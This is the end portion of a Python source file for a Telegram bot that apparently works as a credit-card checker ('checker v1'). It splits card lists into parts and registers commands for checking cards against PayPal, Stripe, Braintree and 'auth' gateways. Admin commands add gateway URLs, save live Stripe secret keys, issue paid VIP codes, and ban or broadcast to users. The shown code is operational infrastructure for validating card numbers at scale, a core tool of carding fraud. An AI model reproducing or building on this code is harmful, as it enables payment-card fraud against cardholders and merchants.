⚡ 𝐋𝐢𝐧𝐞𝐬 𝐩𝐞𝐫 𝐩𝐚𝐫𝐭: <code>{cards_per_part}</code>
⚡ 𝐓𝐨𝐭𝐚𝐥 𝐜𝐚𝐫𝐝𝐬: <code>{total_cards}</code>
- - - - - - - - - - - - - - - -
⚡ 𝐁𝐲: @{username}
- - - - - - - - - - - - - - - -
🤖 checker v1"""
        await msg.edit_text(premium_emoji(result_text), parse_mode="HTML")
        for i in range(num_parts):
            start_idx = i * cards_per_part
            end_idx = start_idx + cards_per_part if i < num_parts - 1 else total_cards
            part_cards = valid_cards[start_idx:end_idx]
            part_file_path = f"downloads/part_{i+1}_{user_id}_{int(time.time())}.txt"
            with open(part_file_path, 'w', encoding='utf-8') as f:
                for card in part_cards:
                    f.write(card + "\n")
            with open(part_file_path, 'rb') as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f, caption=premium_emoji(f"📁 Part {i+1}/{num_parts} - {len(part_cards)} cards"), parse_mode="HTML")
            try:
                os.remove(part_file_path)
            except:
                pass
            await asyncio.sleep(1)
        try:
            os.remove(file_path)
        except:
            pass
    except Exception as e:
        await msg.edit_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


# ==================== Admin - Ban / Unban ====================
async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        target = int(context.args[0])
    except:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/ban_user [id]</code>"), parse_mode="HTML")
        return
    if target == update.effective_user.id:
        await update.message.reply_text(premium_emoji("❌ You can't ban yourself."), parse_mode="HTML")
        return
    add_ban(target)
    await update.message.reply_text(premium_emoji(f"✅ User <code>{target}</code> banned."), parse_mode="HTML")
    try:
        await context.bot.send_message(target, "❌ <b>You cannot use this bot. You are banned.</b>", parse_mode="HTML")
    except:
        pass


async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        target = int(context.args[0])
    except:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/unban_user [id]</code>"), parse_mode="HTML")
        return
    if not is_banned(target):
        await update.message.reply_text(premium_emoji(f"⚠️ User <code>{target}</code> is not banned."), parse_mode="HTML")
        return
    remove_ban(target)
    await update.message.reply_text(premium_emoji(f"✅ User <code>{target}</code> unbanned."), parse_mode="HTML")
    try:
        await context.bot.send_message(target, "✅ <b>You have been unbanned. You can use the bot now.</b>", parse_mode="HTML")
    except:
        pass


async def banned_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    blocked = load_blocked()
    if not blocked:
        await update.message.reply_text(premium_emoji("📋 No banned users."), parse_mode="HTML")
        return
    text = "🚫 <b>Banned Users:</b>\n\n"
    for uid in blocked:
        text += f"• <code>{uid}</code>\n"
    text += f"\n📊 Total: <b>{len(blocked)}</b>"
    await update.message.reply_text(premium_emoji(text), parse_mode="HTML")


# ==================== Admin - Other ====================
async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not context.args:
        return
    code = context.args[0].upper()
    if code not in CODES:
        return
    code_data = CODES[code]
    if code_data["used"] >= code_data["max_users"]:
        return
    VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
    code_data["used"] += 1
    await update.message.reply_text(premium_emoji(f"🚀 VIP activated for {code_data['duration']} days."), parse_mode="HTML")


async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        duration, max_users = int(context.args[0]), int(context.args[1])
        code = "WAFA-" + "-".join("".join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
        CODES[code] = {"duration": duration, "max_users": max_users, "used": 0, "created": time.time()}
        await update.message.reply_text(premium_emoji(f"💰 Code: <code>{code}</code>"), parse_mode="HTML")
    except:
        pass


async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    msg = "📊 Users:\n\n"
    for uid in ALL_USERS:
        status = "BANNED" if is_banned(uid) else "VIP" if uid in VIP_USERS else "NORMAL"
        msg += f"• <code>{uid}</code> - <b>{status}</b>\n"
    await update.message.reply_text(premium_emoji(msg), parse_mode="HTML")


async def add_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        url = context.args[0]
        if url not in GATEWAYS:
            GATEWAYS.append(url)
            await update.message.reply_text(premium_emoji(f"✅ Gateway #{len(GATEWAYS)} added."), parse_mode="HTML")
    except:
        pass


async def remove_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        if context.args:
            idx = int(context.args[0])
            if 1 <= idx <= len(GATEWAYS):
                GATEWAYS.pop(idx - 1)
                await update.message.reply_text(premium_emoji(f"🗑 Gateway #{idx} removed!\n\n📌 Remaining: {len(GATEWAYS)}"), parse_mode="HTML")
            else:
                await update.message.reply_text(premium_emoji(f"❌ Gateway #{idx} not found!"), parse_mode="HTML")
        else:
            if GATEWAYS:
                GATEWAYS.pop()
                await update.message.reply_text(premium_emoji("🗑 Last gateway removed."), parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


async def add_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        VIP_USERS[int(context.args[0])] = int(time.time()) + (int(context.args[1]) * 86400)
        await update.message.reply_text(premium_emoji("✅ VIP added."), parse_mode="HTML")
    except:
        pass


async def remove_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        VIP_USERS.pop(int(context.args[0]), None)
        await update.message.reply_text(premium_emoji("✅ VIP removed."), parse_mode="HTML")
    except:
        pass


async def add_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    args_text = " ".join(context.args)
    pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', args_text)
    sk_match = re.search(r'sk_live_[a-zA-Z0-9]+', args_text)
    if not pk_match or not sk_match:
        await update.message.reply_text(premium_emoji("💡 Usage:\n<code>/addkey pk_live_xxx sk_live_xxx</code>"), parse_mode="HTML")
        return
    pk, sk = pk_match.group(0), sk_match.group(0)
    key_id = str(len(STRIPE_KEYS) + 1)
    STRIPE_KEYS[key_id] = {"pk": pk, "sk": sk}
    with open('stripe_keys.json', 'w') as f:
        json.dump(STRIPE_KEYS, f)
    await update.message.reply_text(premium_emoji(f"✅ Stripe Key Saved!\n🆔 Key ID: <code>{key_id}</code>"), parse_mode="HTML")


async def remove_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    if not context.args:
        return
    key_id = context.args[0]
    if key_id in STRIPE_KEYS:
        del STRIPE_KEYS[key_id]
        new_keys = {}
        for i, (old_key, value) in enumerate(STRIPE_KEYS.items(), 1):
            new_keys[str(i)] = value
        STRIPE_KEYS.clear()
        STRIPE_KEYS.update(new_keys)
        with open('stripe_keys.json', 'w') as f:
            json.dump(STRIPE_KEYS, f)
        await update.message.reply_text(premium_emoji(f"✅ Key {key_id} removed!\n\n📌 Remaining: {len(STRIPE_KEYS)}"), parse_mode="HTML")
    else:
        await update.message.reply_text(premium_emoji(f"❌ Key {key_id} not found!"), parse_mode="HTML")


async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    try:
        user_id = int(context.args[0])
        reply_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=user_id, text=premium_emoji(reply_text), parse_mode="HTML")
    except:
        pass


async def sent_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    broadcast_msg = " ".join(context.args)
    for user_id in list(ALL_USERS):
        try:
            await context.bot.send_message(chat_id=user_id, text=premium_emoji(f"📢 {broadcast_msg}"), parse_mode="HTML")
            await asyncio.sleep(0.05)
        except:
            continue


# ==================== Error Handler ====================
async def error_handler(update, context):
    pass


# ==================== Main ====================
def main():
    # Load Stripe keys
    global STRIPE_KEYS
    try:
        with open('stripe_keys.json', 'r') as f:
            STRIPE_KEYS = json.load(f)
    except:
        STRIPE_KEYS = {}

    app = Application.builder().token(TOKEN).build()
    app.add_error_handler(error_handler)

    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cmds", cmds))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("st", st_check))
    app.add_handler(CommandHandler("bc", bc_check))
    app.add_handler(CommandHandler("auth", auth_check))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("wafa", wafa_command))
    app.add_handler(CommandHandler("show_users", show_users))
    app.add_handler(CommandHandler("show_gateways", show_gateways))
    app.add_handler(CommandHandler("ban_user", ban_user))
    app.add_handler(CommandHandler("unban_user", unban_user))
    app.add_handler(CommandHandler("banned_list", banned_list))
    app.add_handler(CommandHandler("try", try_reply))
    app.add_handler(CommandHandler("SENT", sent_broadcast))
    app.add_handler(CommandHandler("add", add_gateway))
    app.add_handler(CommandHandler("rmadd", remove_gateway))
    app.add_handler(CommandHandler("prm", add_prm))
    app.add_handler(CommandHandler("rmprm", remove_prm))
    app.add_handler(CommandHandler("addkey", add_stripe_key))
    app.add_handler(CommandHandler("rmkey", remove_stripe_key))
    app.add_handler(CommandHandler("clean", clean_command))
    app.add_handler(CommandHandler("parts", parts_command))

    # Documents
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file_panel))

    # Callbacks
    app.add_handler(CallbackQueryHandler(free_cmds_callback, pattern="^free_cmds$"))
    app.add_handler(CallbackQueryHandler(vip_cmds_callback, pattern="^vip_cmds$"))
    app.add_handler(CallbackQueryHandler(admin_cmds_callback, pattern="^admin_cmds$"))
    app.add_handler(CallbackQueryHandler(check_panel_callback, pattern="^check_panel$"))
    app.add_handler(CallbackQueryHandler(check_paypal_callback, pattern="^check_paypal$"))
    app.add_handler(CallbackQueryHandler(check_stripe_callback, pattern="^check_stripe$"))
    app.add_handler(CallbackQueryHandler(check_braintree_callback, pattern="^check_braintree$"))
    app.add_handler(CallbackQueryHandler(check_auth_callback, pattern="^check_auth$"))
    app.add_handler(CallbackQueryHandler(clean_panel_callback, pattern="^clean_panel$"))
    app.add_handler(CallbackQueryHandler(parts_panel_callback, pattern="^parts_panel$"))
    app.add_handler(CallbackQueryHandler(stats_panel_callback, pattern="^stats_panel$"))
    app.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="^back_to_start$"))
    app.add_handler(CallbackQueryHandler(gate_info_callback, pattern="^gate_info_"))
    app.add_handler(CallbackQueryHandler(gate_remove_callback, pattern="^gate_remove_"))
    app.add_handler(CallbackQueryHandler(back_to_gateways_callback, pattern="^back_to_gateways$"))
    app.add_handler(CallbackQueryHandler(close_gateways_callback, pattern="^close_gateways$"))
    app.add_handler(CallbackQueryHandler(gateway_callback, pattern="^gateway_"))
    app.add_handler(CallbackQueryHandler(stop_mass_callback, pattern="^stop_mass_"))

    app.run_polling()


if __name__ == "__main__":
    main()
